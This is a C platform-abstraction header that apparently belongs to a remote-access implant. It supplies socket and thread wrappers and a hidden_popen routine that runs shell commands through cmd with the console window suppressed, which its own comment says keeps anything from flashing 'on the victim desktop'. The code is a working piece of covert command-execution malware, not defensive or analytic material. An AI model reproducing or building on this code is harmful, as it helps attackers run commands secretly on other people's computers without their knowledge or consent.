#ifndef PLATFORM_H
#define PLATFORM_H

/* ── Windows ─────────────────────────────────────────────────────────── */
#ifdef _WIN32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <bcrypt.h>     /* BCryptGenRandom — BP3 secure PRNG */
#include <io.h>         /* _open_osfhandle */
#include <fcntl.h>      /* _O_RDONLY */
#include <stdio.h>

#define SLEEP(x)         Sleep((x) * 1000)
#define CLOSE_SOCKET(x)  closesocket(x)

/*
 * hidden_popen — like _popen("r") but spawns cmd /c <cmd> with
 * CREATE_NO_WINDOW so no console window flashes on the victim desktop.
 * Returns a FILE* whose read end is the child's combined stdout+stderr.
 * Caller closes with fclose().
 */
static inline FILE *hidden_popen(const char *cmd, const char *mode)
{
    (void)mode; /* always reading */

    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength        = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return NULL;

    /* Read end must NOT be inherited by the child */
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);

    char full_cmd[4096];
    _snprintf(full_cmd, sizeof(full_cmd), "cmd /c %s", cmd);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessA(NULL, full_cmd, NULL, NULL,
                              TRUE,             /* inherit write handle */
                              CREATE_NO_WINDOW, /* ← no console window  */
                              NULL, NULL, &si, &pi);

    CloseHandle(hWrite); /* parent no longer needs write end */

    if (!ok) { CloseHandle(hRead); return NULL; }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    int fd = _open_osfhandle((intptr_t)hRead, _O_RDONLY);
    if (fd < 0) { CloseHandle(hRead); return NULL; }

    return _fdopen(fd, "r");
}

#define POPEN(cmd, mode) hidden_popen(cmd, mode)
#define PCLOSE(fp)       fclose(fp)

static inline void platform_init(void)
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
}

static inline void platform_cleanup(void)
{
    WSACleanup();
}

/* BP3 / BP5: cryptographically secure random bytes */
static inline void secure_random(void *buf, int len)
{
    BCryptGenRandom(NULL, (PUCHAR)buf, (ULONG)len,
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

/* ── Threading (Windows) — used by keepalive thread (BP5) ──────────── */
typedef HANDLE          plat_mutex_t;
typedef HANDLE          plat_thread_t;

#define MUTEX_INIT(m)    (*(m) = CreateMutexA(NULL, FALSE, NULL))
#define MUTEX_LOCK(m)    WaitForSingleObject(*(m), INFINITE)
#define MUTEX_TRYLOCK(m) (WaitForSingleObject(*(m), 0) == WAIT_OBJECT_0)
#define MUTEX_UNLOCK(m)  ReleaseMutex(*(m))
#define MUTEX_DESTROY(m) CloseHandle(*(m))

/* fn must be: DWORD WINAPI fn(LPVOID arg) */
#define THREAD_START(t, fn, arg) \
    (*(t) = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(fn), (arg), 0, NULL))
#define THREAD_DETACH(t) CloseHandle(*(t))

/* ── Linux / macOS ────────────────────────────────────────────────────── */
#else

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>     /* read(), close() */
#include <netdb.h>
#include <fcntl.h>      /* open() */
#include <pthread.h>

#define SLEEP(x)         sleep(x)
#define CLOSE_SOCKET(x)  close(x)
#define POPEN(cmd, mode) popen(cmd, mode)
#define PCLOSE(fp)       pclose(fp)

static inline void platform_init(void)  {}
static inline void platform_cleanup(void) {}

/* BP3 / BP5: cryptographically secure random bytes via /dev/urandom */
static inline void secure_random(void *buf, int len)
{
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) return;
    int done = 0;
    while (done < len) {
        int n = (int)read(fd, (char *)buf + done, (size_t)(len - done));
        if (n > 0) done += n; else break;
    }
    close(fd);
}

/* ── Threading (pthreads) ────────────────────────────────────────────── */
typedef pthread_mutex_t plat_mutex_t;
typedef pthread_t       plat_thread_t;

#define MUTEX_INIT(m)    pthread_mutex_init(m, NULL)
#define MUTEX_LOCK(m)    pthread_mutex_lock(m)
#define MUTEX_TRYLOCK(m) (pthread_mutex_trylock(m) == 0)
#define MUTEX_UNLOCK(m)  pthread_mutex_unlock(m)
#define MUTEX_DESTROY(m) pthread_mutex_destroy(m)

/* fn must be: void *fn(void *arg) */
#define THREAD_START(t, fn, arg) pthread_create(t, NULL, fn, arg)
#define THREAD_DETACH(t)         pthread_detach(*(t))

#endif /* _WIN32 */

#endif /* PLATFORM_H */
